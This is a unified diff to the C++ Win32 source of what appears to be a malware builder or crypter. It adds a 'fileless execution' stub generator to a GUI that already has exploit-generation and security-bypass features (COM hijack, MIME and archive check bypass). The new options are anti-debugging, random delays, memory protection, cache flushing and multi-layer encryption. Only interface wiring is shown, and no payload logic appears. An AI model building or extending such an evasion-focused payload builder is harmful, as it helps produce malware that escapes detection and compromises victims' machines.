@@ -37,6 +37,7 @@
 #include "cross_platform_encryption.h"
 #include "enhanced_loader_utils.h"
 #include "enhanced_bypass_generator.h"
+#include "fileless_execution_generator.h"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -95,6 +96,14 @@ constexpr int ID_BYPASS_MIME_CHECK = 1038;
 constexpr int ID_BYPASS_ARCHIVE_CHECK = 1039;
 constexpr int ID_CREATE_BYPASS_STUB = 1040;
 
+// Fileless Execution Controls
+constexpr int ID_FILELESS_ANTIDEBUG_CHECK = 1041;
+constexpr int ID_FILELESS_DELAYS_CHECK = 1042;
+constexpr int ID_FILELESS_MEMORY_PROTECT_CHECK = 1043;
+constexpr int ID_FILELESS_CACHE_FLUSH_CHECK = 1044;
+constexpr int ID_FILELESS_MULTILAYER_CHECK = 1045;
+constexpr int ID_CREATE_FILELESS_STUB = 1046;
+
 // Global variables for mass generation
 bool g_massGenerationActive = false;
 HANDLE g_massGenerationThread = NULL;
@@ -124,6 +133,14 @@ HWND g_hBypassComHijackCheck;
 HWND g_hBypassMimeCheck;
 HWND g_hBypassArchiveCheck;
 HWND g_hCreateBypassStubButton;
+
+// Fileless Execution HWNDs
+HWND g_hFilelessAntiDebugCheck;
+HWND g_hFilelessDelaysCheck;
+HWND g_hFilelessMemoryProtectCheck;
+HWND g_hFilelessCacheFlushCheck;
+HWND g_hFilelessMultiLayerCheck;
+HWND g_hCreateFilelessStubButton;
 
 // Exploit Delivery Types
 enum ExploitDeliveryType {
@@ -1887,6 +1904,7 @@ public:
     EmbeddedCompiler embeddedCompiler;
     PrivateExploitGenerator privateExploitGen;
     EnhancedBypassGenerator bypassGenerator;
+    FilelessExecutionGenerator filelessGenerator;
     
     struct CompanyProfile {
         std::string name;
@@ -3607,17 +3625,40 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
             g_hCreateBypassStubButton = CreateWindowW(L"BUTTON", L"Create Enhanced Bypass Stub", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                                      10, 620, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_BYPASS_STUB, NULL, NULL);
             
-            // Custom icon input (sixth row)
+            // Fileless Execution Controls (sixth row)
+            CreateWindowW(L"STATIC", L"Fileless Execution Options:", WS_VISIBLE | WS_CHILD,
+                         10, 655, 160, 20, hwnd, NULL, NULL, NULL);
+            
+            g_hFilelessAntiDebugCheck = CreateWindowW(L"BUTTON", L"Anti-Debug", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | BS_CHECKED,
+                                                     10, 675, 90, 20, hwnd, (HMENU)(UINT_PTR)ID_FILELESS_ANTIDEBUG_CHECK, NULL, NULL);
+            
+            g_hFilelessDelaysCheck = CreateWindowW(L"BUTTON", L"Random Delays", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | BS_CHECKED,
+                                                  110, 675, 100, 20, hwnd, (HMENU)(UINT_PTR)ID_FILELESS_DELAYS_CHECK, NULL, NULL);
+            
+            g_hFilelessMemoryProtectCheck = CreateWindowW(L"BUTTON", L"Memory Protect", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | BS_CHECKED,
+                                                         220, 675, 110, 20, hwnd, (HMENU)(UINT_PTR)ID_FILELESS_MEMORY_PROTECT_CHECK, NULL, NULL);
+            
+            g_hFilelessCacheFlushCheck = CreateWindowW(L"BUTTON", L"Cache Flush", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | BS_CHECKED,
+                                                      340, 675, 90, 20, hwnd, (HMENU)(UINT_PTR)ID_FILELESS_CACHE_FLUSH_CHECK, NULL, NULL);
+            
+            g_hFilelessMultiLayerCheck = CreateWindowW(L"BUTTON", L"Multi-Layer Encrypt", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX | BS_CHECKED,
+                                                      10, 700, 130, 20, hwnd, (HMENU)(UINT_PTR)ID_FILELESS_MULTILAYER_CHECK, NULL, NULL);
+            
+            // Fileless Stub Generation Button
+            g_hCreateFilelessStubButton = CreateWindowW(L"BUTTON", L"Create Fileless Execution Stub", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                                       150, 700, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_FILELESS_STUB, NULL, NULL);
+            
+            // Custom icon input (seventh row)
             CreateWindowW(L"STATIC", L"Custom Icon:", WS_VISIBLE | WS_CHILD,
-                         10, 660, 80, 20, hwnd, NULL, NULL, NULL);
+                         10, 740, 80, 20, hwnd, NULL, NULL, NULL);
             g_hCustomIconEdit = CreateWindowW(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
-                                             95, 657, 280, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_EDIT, NULL, NULL);
+                                             95, 737, 280, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_EDIT, NULL, NULL);
             g_hCustomIconBrowse = CreateWindowW(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                                               385, 657, 60, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_BROWSE, NULL, NULL);
+                                               385, 737, 60, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_BROWSE, NULL, NULL);
             
             // Advanced exploit creation button
             CreateWindowW(L"BUTTON", L"Create Advanced Private Exploit", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                         220, 620, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_ADVANCED_EXPLOIT, NULL, NULL);
+                         10, 770, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_ADVANCED_EXPLOIT, NULL, NULL);
             
             // Enable drag and drop
             DragAcceptFiles(hwnd, TRUE);
@@ -3697,6 +3738,12 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                 case ID_CREATE_ADVANCED_EXPLOIT: {
                     // Create advanced private exploit with all the new features
                     std::thread(createAdvancedPrivateExploit).detach();
+                    break;
+                }
+                
+                case ID_CREATE_FILELESS_STUB: {
+                    // Create fileless execution stub
+                    std::thread(createFilelessExecutionStub).detach();
                     break;
                 }
                 
